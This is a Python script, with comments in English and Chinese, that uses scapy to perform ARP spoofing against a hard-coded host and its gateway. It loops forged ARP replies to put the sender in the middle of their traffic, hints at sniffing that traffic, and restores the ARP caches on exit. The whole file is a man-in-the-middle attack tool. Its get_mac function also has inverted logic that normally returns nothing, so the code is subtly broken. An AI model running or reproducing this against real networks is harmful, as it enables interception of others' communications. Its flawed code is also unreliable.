import scapy.all as scapy
import time


def get_mac(ip):
    #Create ARP request directed to broadcast MAC asking for IP#
    arp_request = scapy.ARP(pdst=ip)  #only need for IP Field
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  #利用scapy模組的Ether物件
    arp_request_broadcast = broadcast/arp_request  #把arp_request跟broadcast混合，發送此混合封包，然後它會自動送到廣播的MAC address，去詢問我們想知道的IP位址
    #----------------------------------------------------------#
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  #Send packet and receive response
    if answered_list == "":
        return (answered_list[0][1].hwsrc)  

def spoof(target_ip, spoof_ip): #輸入目標的IP, 我們假裝的IP
    target_mac = get_mac(target_ip) #call 已寫好的get_mac的function
    packet = scapy.ARP(op=2, pdst=target_ip,
    hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet) #發送封包

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                            hwdst=destination_mac,
                            psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    
    
    
target_ip = "192.168.0.102"
gateway_ip = "192.168.0.1"
get_mac(gateway_ip)

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(2)  # Waits for two seconds
        # scapy.sniff( filter="ip src 192.168.1.155", prn=action)
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")


    